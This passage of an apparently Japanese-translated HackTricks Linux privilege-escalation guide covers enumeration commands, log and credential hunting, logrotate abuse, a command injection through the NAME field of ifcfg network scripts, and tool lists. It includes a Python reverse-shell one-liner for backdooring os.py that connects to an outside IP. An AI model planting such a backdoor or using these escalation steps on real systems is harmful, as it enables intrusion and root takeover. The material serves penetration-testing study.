### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを確認してください。これは **パスワードを含んでいる可能性のある複数のファイル** を検索します。\
**別の興味深いツール** として使用できるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、これは Windows、Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読める場合、そこから **興味深い／機密情報** を見つけられるかもしれません。ログが奇妙であればあるほど、より興味深くなる可能性が高いです（おそらく）。\
また、設定が “**悪い**”（バックドア入り？）な **audit logs** によっては、audit logs 内に **パスワードを記録** できる場合があります。詳しくはこの投稿を参照してください: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や**内容**に**password**という単語が含まれるファイル、ログ内のIPsやemails、あるいはhashes regexpsもチェックしてください。\  
ここでこれらすべての方法を列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が行う最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし**どこで**pythonスクリプトが実行されるか分かっていて、そのフォルダに**書き込み可能**であるか、または**modify python libraries**できるなら、OS libraryを変更してbackdoorすることができます（pythonスクリプトが実行される場所に書き込みできる場合は、os.pyライブラリをコピーして貼り付けてください）。

ライブラリに**backdoor the library**するには、os.pyライブラリの末尾に次の行を追加してください（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格できる可能性があります。これは `logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するよう操作できるためです。権限は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` の `3.18.0` 以前のバージョンに影響します

詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に似ているため、ログを変更できる場合は誰がそれらのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて特権昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

もし何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込む** ことができる、または既存のスクリプトを **修正** できるなら、あなたの **system is pwned** です。

Network scripts、_ifcg-eth0_ のようなものはネットワーク接続に使われます。見た目は .INI ファイルとまったく同じです。しかし、それらは Network Manager (dispatcher.d) によって Linux 上で \~sourced\~ されます。

私の場合、これらの network scripts にある `NAME=` 属性は正しく処理されていません。名前に **空白が含まれている場合、システムは空白の後の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, および rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用のスクリプトの格納場所です。これは従来の Linux サービス管理システムです。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は Upstart に関連しており、サービス管理タスクのための設定ファイルを使用する新しいサービス管理システムです。Ubuntu による Upstart への移行があっても、Upstart の互換レイヤーにより SysVinit スクリプトは Upstart の構成と併用され続けています。

**systemd** はモダンな初期化およびサービス管理システムとして登場し、オンデマンドでのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を提供します。配布パッケージ用のファイルは `/usr/lib/systemd/` に、管理者による変更は `/etc/systemd/system/` に整理されており、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は通常、特権的なカーネル機能を userspace の manager に公開するために syscall をフックします。弱い manager 認証（例：FD-order に基づく署名チェックや不十分なパスワード方式）があると、ローカルアプリが manager を偽装して、既に root 化されたデバイス上で root へエスカレートできる可能性があります。詳細とエクスプロイトの手順はこちら：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における正規表現駆動のサービス検出は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで `-v` を付けて実行することがあります。例えば `\S` のような寛容なパターンは、`/tmp/httpd` のような書き込み可能な場所に設置された攻撃者のリスナーと一致し、root としての実行を招く可能性があります（CWE-426 Untrusted Search Path）。

詳細と、他の discovery/monitoring スタックにも適用可能な一般化パターンはここで確認してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- https://github.com/a13xp0p0v/kconfig-hardened-check
- https://github.com/a13xp0p0v/linux-kernel-defence-map

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux のローカル privilege escalation ベクターを調査するための最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
